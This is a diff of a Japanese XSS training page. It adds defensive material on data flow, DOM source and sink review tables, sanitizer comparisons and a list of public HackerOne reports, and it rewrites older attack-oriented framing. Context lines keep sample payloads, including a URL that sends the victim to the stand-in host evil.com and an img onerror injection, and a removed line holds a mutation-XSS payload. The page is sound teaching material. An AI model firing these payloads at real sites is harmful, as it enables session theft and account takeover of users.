@@ -36,6 +36,36 @@
             <p>Module 00 (HTTP) と Module 01 (Browser Security) を先に完了してください。特に SOP, Cookie, CSP の理解が XSS の impact を正しく評価するために必要です。</p>
         </div>
 
+        <section class="section" id="data-flow">
+            <h2>まず1つの値を最後まで追う</h2>
+            <p>レビューでは「誰が決めた値を、どこで読み、何に変換し、どこでどう解釈するか」を一行で書く。検索語を画面に出すなら、たとえば次の経路になる。</p>
+            <pre><code>共有された URL → URLSearchParams.get('q') → 文字列 → 見出しの textContent</code></pre>
+            <p><strong>Source</strong> は値を読む入口。<strong>Sink</strong> は値が使われる出口。同じ文字列でも、通常の見出しの textContent はテキストノードを作り、innerHTML の setter は HTML パーサーを呼ぶ。監査で重要なのは API 名と、実際の呼び出し方・表示先の組み合わせ。</p>
+            <table>
+                <thead><tr><th>表示の要件</th><th>選ぶ処理</th><th>修正をどう確かめるか</th></tr></thead>
+                <tbody>
+                    <tr><td>検索語を原文どおりに表示</td><td>サーバーではテンプレートの HTML 本文用エンコード。ブラウザーでは通常の本文要素に textContent で代入する。</td><td>&lt;b&gt; の3文字が見え、b 要素が生成されない。textContent に渡す前に HTML エンコードすると、実体参照がそのまま見えてしまう。</td></tr>
+                    <tr><td>装飾を許可する本文</td><td><strong>Sanitizer</strong> は HTML を解析し、許可した要素・属性・URL のポリシーに合う構造を残す。保守されているライブラリを使い、最終的な HTML の表示先に合わせて設定する。</td><td>許可した強調は残り、許可外の属性は DOM に存在しない。処理後に元の入力を連結したり、別の文脈で再解析したりする箇所まで確認する。</td></tr>
+                    <tr><td>外部への HTTPS リンク</td><td>URL として解析して protocol を検証し、固定した a 要素の href に設定する。リンクのラベルには textContent を使う。</td><td>相対 URL と HTTP URL を拒否し、HTTPS URL は通る。自社サイト専用のリンクなら origin の制限も必要。</td></tr>
+                    <tr><td>JavaScript に値を渡す</td><td>JSON のレスポンスをデータとして読み、通常の関数引数として扱う。入力をインラインのコードやテンプレート式に連結しない。</td><td>引用符を含む値でも元の文字列として読め、画面に出す段階ではその表示先に合う処理を使っている。</td></tr>
+                </tbody>
+            </table>
+            <h3 id="html-sanitizers">HTML サニタイザーを読み比べる</h3>
+            <p>たとえば「コメントでは strong と em を使えるが、属性は付けられない」という仕様なら、どの実装でも同じ問いで検証できる。<code>&lt;strong title="注釈"&gt;京都&lt;/strong&gt;</code>を処理した結果、画面では「京都」が強調され、最終 DOM に strong 要素が1個あり、title 属性が消えているかを確認しよう。</p>
+            <table>
+                <thead><tr><th>実装</th><th>実行環境</th><th>コードレビューで見る箇所</th></tr></thead>
+                <tbody>
+                    <tr><td><a href="https://github.com/cure53/DOMPurify">DOMPurify</a></td><td>ブラウザーなど DOM がある環境</td><td>実習では許可タグ・属性を指定し、data 属性と ARIA 属性も無効にする。戻り値を DocumentFragment として表示先に渡す。</td></tr>
+                    <tr><td><a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML">HTML Sanitizer API</a></td><td>対応ブラウザー</td><td>要素の setHTML() が表示先の文脈で HTML を解析・サニタイズして挿入する。対象ブラウザーでこのメソッドを利用できるかを確認する。</td></tr>
+                    <tr><td><a href="https://github.com/apostrophecms/apostrophe/tree/main/packages/sanitize-html">sanitize-html</a></td><td>Node.js</td><td>allowedTags と allowedAttributes を確認する。リンクを許す設計なら、許可する URL スキームもポリシーの一部になる。</td></tr>
+                    <tr><td><a href="https://github.com/OWASP/java-html-sanitizer">OWASP Java HTML Sanitizer</a></td><td>Java</td><td>HtmlPolicyBuilder で許可する要素や属性を定義し、そのポリシーを投稿本文に適用している箇所を追う。</td></tr>
+                    <tr><td><a href="https://pypi.org/project/nh3/">nh3</a></td><td>Python</td><td>Rust の Ammonia を Python から利用する。本文用に許可したタグや属性と、処理済みの HTML を最終的に埋め込む場所を確認する。</td></tr>
+                </tbody>
+            </table>
+            <p>Reflected と Stored は<strong>値がいつ届くか</strong>、DOM-based は<strong>どのコードが解釈先を選ぶか</strong>、Mutation は<strong>解析の前後で何が変わるか</strong>という問い。保存されたコメントを API が返し、フロントエンドが HTML として挿入する場合は、Stored と DOM-based が同時に当てはまる。</p>
+            <p><a href="../labs/xss-flow.html">データフロー実習を始める</a> ／ <a href="#academy-coverage">Academy との対応を見る</a></p>
+        </section>
+
         <!-- 最初の一歩 -->
         <div class="section">
             <h2>まず体感する: 30秒で分かる XSS</h2>
@@ -55,7 +85,7 @@
         <div class="section">
             <h2>XSS の原理</h2>
             <p>
-                Webアプリケーションが <strong>ユーザー入力を適切にサニタイズ (=危険な文字を除去/無害化) せずに HTML/JavaScript として出力</strong> すると、
+                外部から届いた値が、本来表示したかったデータの境界を越え、<strong>そのオリジンで実行できるコードとしてブラウザーに解釈される</strong>と、
                 攻撃者が注入したスクリプトが被害者のブラウザで実行される。
             </p>
             <p>
@@ -99,7 +129,7 @@ sequenceDiagram
             <h3>1. Reflected XSS</h3>
             <p>
                 ユーザーの入力がリクエスト内に含まれ、レスポンスにそのまま反射 (reflect) される。
-                攻撃者は悪意あるURLを被害者に踏ませる必要がある。
+                入力を含むリクエストへの応答で問題が生じる。検索リンクはその一例。
             </p>
 <pre><code>// 脆弱なサーバー側コード (Express)
 app.get('/search', (req, res) => {
@@ -112,7 +142,7 @@ https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/?
             <h3>2. Stored XSS (Persistent XSS)</h3>
             <p>
                 攻撃者の入力がサーバーに保存され、他のユーザーがそのページを表示するたびにスクリプトが実行される。
-                Impact が高い（被害者がリンクを踏む必要がない）。
+                閲覧者の範囲、権限、必要な操作によって影響が変わる。
             </p>
 <pre><code>// プロフィール表示 (脆弱)
 &lt;div class="bio"&gt;${user.bio}&lt;/div&gt;
@@ -122,8 +152,7 @@ https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/?
 
             <h3>3. DOM-based XSS</h3>
             <p>
-                サーバーを経由せず、<strong>クライアントサイドの JavaScript</strong> がユーザー入力を unsafe な方法で DOM に書き込む。
-                レスポンス body には payload が含まれないため、WAF での検知が困難。
+                <strong>クライアントサイドの JavaScript が値をどの sink に渡すか</strong>で決まる。URL のフラグメントは HTTP リクエストに含まれない。一方、検索 API の応答や保存済みコメントも DOM-based XSS の source になり得る。
             </p>
 <pre><code>// 脆弱な JS コード
 const hash = location.hash.slice(1);
@@ -132,26 +161,39 @@ document.getElementById('output').innerHTML = hash;
 // Attack URL
 https://example.com/page#&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
 
-            <h4>DOM XSS の Source と Sink</h4>
+            <p>Source は値を取り込む場所、Sink はその値を HTML・コード・URL などとして解釈する場所。たとえば検索語を検索結果の見出しに表示するときは、URL から読み取った値が、途中で加工・保存された後も最後までテキストとして扱われるかを追う。</p>
+
+            <h4>Source（入力元）</h4>
             <table>
-                <thead><tr><th>Source (入力元)</th><th>Sink (出力先 - 危険)</th></tr></thead>
+                <thead><tr><th>用途</th><th>値を読み取る関数・プロパティ</th><th>レビューの観点</th></tr></thead>
                 <tbody>
-                    <tr><td><code>location.hash</code></td><td><code>element.innerHTML</code></td></tr>
-                    <tr><td><code>location.search</code></td><td><code>document.write()</code></td></tr>
-                    <tr><td><code>document.referrer</code></td><td><code>eval()</code></td></tr>
-                    <tr><td><code>window.name</code></td><td><code>setTimeout(string)</code></td></tr>
-                    <tr><td><code>postMessage data</code></td><td><code>jQuery.html()</code></td></tr>
-                    <tr><td><code>localStorage/sessionStorage</code></td><td><code>$.globalEval()</code></td></tr>
+                    <tr><td>URL</td><td><code>location.hash</code>、<code>location.search</code>、<code>location.href</code>、<code>URLSearchParams.get()</code>、<code>URLSearchParams.getAll()</code></td><td>URL を組み立てた人が指定できる値。パラメーターを解析しても表示用に安全になるわけではない。</td></tr>
+                    <tr><td>ページ間の受け渡し</td><td><code>document.referrer</code>、<code>window.name</code>、<code>MessageEvent.data</code></td><td>message イベントでは送信元の origin とデータの型・構造を確認する。</td></tr>
+                    <tr><td>フォーム</td><td><code>HTMLInputElement.value</code>、<code>HTMLTextAreaElement.value</code>、<code>FormData.get()</code>、<code>FormData.getAll()</code></td><td>画面での入力制限とは別に、プレビューや保存後の再表示で値をどう扱うか確認する。</td></tr>
+                    <tr><td>ブラウザー内の保存値</td><td><code>localStorage.getItem()</code>、<code>sessionStorage.getItem()</code>、<code>document.cookie</code></td><td>読み出す側から書き込み元までたどる。Cookie のうち HttpOnly の値は JavaScript から読めない。</td></tr>
+                    <tr><td>通信結果</td><td><code>Response.text()</code>、<code>Response.json()</code>、<code>XMLHttpRequest.responseText</code></td><td>同一オリジンの API にも他の利用者の投稿が含まれ得る。JSON を解析した後も各フィールドの由来を確認する。</td></tr>
+                    <tr><td>ファイルとクリップボード</td><td><code>Blob.text()</code>、<code>FileReader.readAsText()</code>、<code>ClipboardEvent.clipboardData</code></td><td>ファイルの内容や貼り付けた文字列も外部入力。readAsText() の結果は読み込み完了後に result から取得する。</td></tr>
+                    <tr><td>DOM に保持した値</td><td><code>Element.getAttribute()</code>、<code>HTMLElement.dataset</code>、<code>Node.textContent</code></td><td>最初の書き込み元を確認する。テキストとして表示済みの値でも、読み戻した後の出力先によって扱いが変わる。</td></tr>
+                </tbody>
+            </table>
+
+            <h4>Sink（値の解釈先）</h4>
+            <table>
+                <thead><tr><th>用途</th><th>値を渡す関数・プロパティ</th><th>レビューの観点</th></tr></thead>
+                <tbody>
+                    <tr><td>HTML の挿入・置換</td><td><code>Element.innerHTML</code>、<code>Element.outerHTML</code>、<code>Element.insertAdjacentHTML()</code>、<code>ShadowRoot.innerHTML</code></td><td>文字列を HTML として解析する。本文だけを表示するなら通常の表示要素の textContent を使う。</td></tr>
+                    <tr><td>文書への書き込み</td><td><code>document.write()</code>、<code>document.writeln()</code>、<code>HTMLIFrameElement.srcdoc</code></td><td>入力を文書のマークアップとして扱う。要素の作成には createElement()、テキストの追加には createTextNode() を使う。</td></tr>
+                    <tr><td>HTML 断片の生成</td><td><code>Range.createContextualFragment()</code>、<code>DOMParser.parseFromString()</code></td><td>HTML の解析と画面への挿入は別の段階。生成したノードをどこに挿入するかまで確認する。</td></tr>
+                    <tr><td>コードの評価</td><td><code>eval()</code>、<code>Function()</code>、<code>setTimeout()</code>、<code>setInterval()</code>、<code>jQuery.globalEval()</code></td><td>タイマーでは文字列を渡すとコードとして評価される。処理を関数として定義し、入力値はその引数として渡す。</td></tr>
+                    <tr><td>属性の設定</td><td><code>Element.setAttribute()</code>、<code>Element.setAttributeNS()</code></td><td>危険性は属性名で変わる。イベント処理には addEventListener() と関数を使い、入力で属性名を選ばせない。</td></tr>
+                    <tr><td>URL の設定</td><td><code>HTMLAnchorElement.href</code>、<code>HTMLScriptElement.src</code>、<code>location.assign()</code>、<code>location.replace()</code></td><td>リンク・遷移先は許可するスキームを確認する。スクリプトの読み込み先はアプリが管理する URL に限定する。</td></tr>
+                    <tr><td>jQuery の DOM 操作</td><td><code>jQuery.html()</code>、<code>jQuery.append()</code>、<code>jQuery.prepend()</code>、<code>jQuery.before()</code>、<code>jQuery.after()</code>、<code>jQuery.replaceWith()</code></td><td>HTML 文字列を渡す呼び出しを確認する。文字を表示するなら .text(value) を使う。.html() は引数なしなら読み取り。</td></tr>
                 </tbody>
             </table>
 
             <h3>4. Mutation XSS (mXSS)</h3>
-            <p>
-                HTMLサニタイザーが安全と判定した HTML が、ブラウザの DOM パーサーによる<strong>正規化 (mutation)</strong> の結果
-                実行可能な形に変化する。DOMPurify の bypass 事例が有名。
-            </p>
-<pre><code>// サニタイザーは安全と判定するが、ブラウザのparser が mutation する例
-&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src onerror=alert(1)&gt;</code></pre>
+            <p>サニタイザーが検査した DOM と、ブラウザーが最終的に解釈する DOM が異なり、その差で実行可能な構造が生じる場合を mXSS と呼ぶ。確認すべきなのは、検査した木、シリアライズした文字列、実際の表示先で再解析した木の3つ。</p>
+            <p><a href="../labs/xss-flow.html#mutation">表の行を3種類の親要素に転記する実習</a>で、このうち構造が変わる部分を観察できる。</p>
         </div>
 
         <!-- 検出方法 -->
@@ -392,6 +434,45 @@ document.body.innerHTML = `
                 Desktop アプリの BB プログラムは特に狙い目。</p>
             </div>
 
+            <h3 id="hackerone-reading-list">テーマ別に読む HackerOne 公開レポート 20 選</h3>
+            <p>公開レポートの得票順に並ぶ <a href="https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPXSS.md">XSS レポート索引</a>の上位から選んだ。各リンクは HackerOne の原文を開く。</p>
+            <h4>URL とブラウザーでの描画</h4>
+            <p>URL のどの部分が入力元か、表示を作るのがサーバーかブラウザーかに注目する。</p>
+            <ul>
+                <li><a href="https://hackerone.com/reports/146336">Slack #146336</a> — URL フラグメントのパラメーター</li>
+                <li><a href="https://hackerone.com/reports/868934">DuckDuckGo #868934</a> — 検索画面の DOM XSS</li>
+                <li><a href="https://hackerone.com/reports/846338">Glassdoor #846338</a> — 雇用主向けページの Reflected XSS</li>
+                <li><a href="https://hackerone.com/reports/840759">HackerOne #840759</a> — 公開サイトとリソースサイトの Reflected XSS</li>
+                <li><a href="https://hackerone.com/reports/986386">HackerOne #986386</a> — Wistia の埋め込みコードに関係する Reflected XSS</li>
+            </ul>
+            <h4>保存されたコンテンツの表示</h4>
+            <p>入力した人と後から読む人を書き出す。メール・メッセージ・投稿では、同じ保存型でも閲覧者の範囲が変わる。</p>
+            <ul>
+                <li><a href="https://hackerone.com/reports/484434">Imgur #484434</a> — プロフィールに保存される XSS</li>
+                <li><a href="https://hackerone.com/reports/982291">Basecamp #982291</a> — HEY のメール表示での Stored XSS</li>
+                <li><a href="https://hackerone.com/reports/487081">WordPress #487081</a> — BuddyPress のプライベートメッセージ</li>
+                <li><a href="https://hackerone.com/reports/526325">GitLab #526325</a> — Wiki ページの Stored XSS</li>
+                <li><a href="https://hackerone.com/reports/662287">GitLab #662287</a> — RDoc 形式の Wiki ページ</li>
+                <li><a href="https://hackerone.com/reports/1212067">GitLab #1212067</a> — Markdown の DesignReferenceFilter</li>
+                <li><a href="https://hackerone.com/reports/1930763">Reddit #1930763</a> — 予約投稿のリッチテキストパーサー</li>
+            </ul>
+            <h4>入力した画面と影響が出る画面</h4>
+            <p>どの画面なら入力者が結果を見られるか、別の担当者だけが閲覧する画面はどれかを区別して読む。</p>
+            <ul>
+                <li><a href="https://hackerone.com/reports/1010466">CS Money #1010466</a> — 画像アップロードに関係する Blind XSS</li>
+                <li><a href="https://hackerone.com/reports/1207040">Twitter #1207040</a> — 社内のデータ分析画面での Blind XSS</li>
+                <li><a href="https://hackerone.com/reports/946053">Shopify #946053</a> — スタッフ名が別の内部画面に表示される事例</li>
+                <li><a href="https://hackerone.com/reports/411690">Alliance of American Football #411690</a> — 請求履歴の住所欄に保存される XSS</li>
+            </ul>
+            <h4>ログインとアカウント連携</h4>
+            <p>ログインの各段階で表示中のオリジンと利用者の認証状態をメモする。報告者が確認した影響の範囲にも注目する。</p>
+            <ul>
+                <li><a href="https://hackerone.com/reports/697099">LY Corporation #697099</a> — OAuth 2 ログインフローの Reflected XSS</li>
+                <li><a href="https://hackerone.com/reports/691611">Shopify #691611</a> — Google ログイン時に発生する XSS</li>
+                <li><a href="https://hackerone.com/reports/1962645">Reddit #1962645</a> — アカウントサイトのリダイレクトパラメーター</li>
+                <li><a href="https://hackerone.com/reports/683298">MoPub #683298</a> — ログイン画面の XSS とオープンリダイレクト</li>
+            </ul>
+
             <h3>高額 XSS のパターン分析</h3>
             <table>
                 <thead><tr><th>パターン</th><th>Impact 上昇理由</th><th>報奨金レンジ</th></tr></thead>
@@ -423,25 +504,20 @@ document.body.innerHTML = `
         <!-- Practice -->
         <div class="section">
             <h2>Practice</h2>
+            <p><a href="../labs/xss.html">XSS 表示検証ドリル（12問）</a> — 入力が表示先でどう扱われるべきかを予想し、実際の結果と比較する。</p>
 
-            <h4>Web Security Academy Labs (推奨順)</h4>
-            <ol>
-                <li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" target="_blank">Reflected XSS into HTML context with nothing encoded</a> (Apprentice)</li>
-                <li><a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded" target="_blank">Stored XSS into HTML context with nothing encoded</a> (Apprentice)</li>
-                <li><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" target="_blank">DOM XSS in document.write sink</a> (Apprentice)</li>
-                <li><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked" target="_blank">Reflected XSS with most tags and attributes blocked</a> (Practitioner)</li>
-                <li><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded" target="_blank">Reflected XSS in JS string with angle brackets HTML encoded</a> (Practitioner)</li>
-                <li><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored" target="_blank">Stored DOM XSS</a> (Practitioner)</li>
-                <li><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies" target="_blank">Exploiting XSS to steal cookies</a> (Practitioner)</li>
-                <li><a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy" target="_blank">XSS with CSP bypass</a> (Expert)</li>
-            </ol>
-
-            <h4>ローカル演習</h4>
-            <ul>
-                <li><code>practice/bb-whitebox-01</code> の route ファイルで XSS sink を探す (Phase 2 で詳細)</li>
-                <li><a href="https://xss-game.appspot.com/" target="_blank">XSS Game (Google)</a></li>
-                <li><a href="https://prompt.ml/" target="_blank">prompt.ml</a> — XSS filter bypass チャレンジ</li>
-            </ul>
+            <h3 id="academy-coverage">Web Security Academy との対応</h3>
+            <table>
+                <thead><tr><th>テーマ</th><th>この教材で確認できる範囲</th><th>次に読む公式教材</th></tr></thead>
+                <tbody>
+                    <tr><td>Reflected / Stored</td><td><a href="../labs/xss-flow.html#http">実習1・2</a>で HTTP 応答と再訪を比較し、出力エンコードを検証する。</td><td><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Reflected</a> ／ <a href="https://portswigger.net/web-security/cross-site-scripting/stored">Stored</a></td></tr>
+                    <tr><td>DOM-based、Reflected DOM、Stored DOM</td><td><a href="../labs/xss-flow.html#dom">実習3</a>で fragment と表示先を追う。<a href="../labs/xss-flow.html#http">掲示板の比較課題</a>で保存済み JSON の描画を追う。Reflected DOM の個別ラボは公式側で扱う。</td><td><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">DOM-based XSS</a></td></tr>
+                    <tr><td>HTML 本文・属性・URL・JavaScript・テンプレート式</td><td>本文と HTTPS リンクは表示ドリルで検証する。属性や JavaScript 文字列の文脈は解説まで。テンプレートリテラルや AngularJS 固有の挙動は公式教材へ。</td><td><a href="https://portswigger.net/web-security/cross-site-scripting/contexts">XSS contexts</a> ／ <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection">Client-side template injection</a></td></tr>
+                    <tr><td>HTML のフィルタリングと再解析</td><td><a href="../labs/xss-flow.html#sanitize">実習4・5</a>で許可タグ・属性と再解析後の DOM を検証する。mXSS の例はパーサーを理解するための補助演習。</td><td><a href="https://portswigger.net/web-security/cross-site-scripting/preventing">Preventing XSS</a></td></tr>
+                    <tr><td>発展問題</td><td>CSP は概要と確認問題、影響評価は公開事例で学ぶ。フレームワーク固有の sink、タグ・属性の個別制約、CSP、dangling markup、影響実証を扱う各ラボの実技は公式側の範囲。</td><td><a href="https://portswigger.net/web-security/all-labs#cross-site-scripting">Academy の XSS ラボ一覧</a></td></tr>
+                </tbody>
+            </table>
+            <p>読了の目安は、初めて見る画面について source、途中の変換、sink、適切な防御を説明し、修正後に何を観察すればよいか答えられること。<a href="../quizzes/q-10-xss.html">5問で理解度を確認する</a>。</p>
         </div>
 
         <!-- Key Takeaways -->
@@ -450,9 +526,9 @@ document.body.innerHTML = `
             <div class="card">
                 <ul>
                     <li><strong>出力コンテキスト</strong>を必ず特定する — HTML body, 属性, JS 内, URL で payload が全く違う</li>
-                    <li><strong>DOM XSS は server response に痕跡が残らない</strong> — JS ファイルの source→sink 分析が必要</li>
+                    <li><strong>DOM-based はブラウザー側の処理を追う</strong> — HTTP 応答の値も source になり得る</li>
                     <li><strong>Impact を示す</strong> — alert() だけでなく ATO/data theft の PoC を付ける</li>
-                    <li><strong>Stored > Reflected</strong> — 保存型は被害者がリンクを踏む必要がない分、severity が高い</li>
+                    <li><strong>影響範囲を記録する</strong> — 表示する人の権限、入力の残る期間、閲覧に必要な操作を区別する</li>
                     <li><strong>CSP は defence-in-depth</strong> — XSS が見つかっても CSP が堅ければ severity は下がる</li>
                     <li><strong>mXSS</strong> — HTML サニタイザーを使っていても安心できない（ブラウザの DOM 正規化で突破される）</li>
                 </ul>
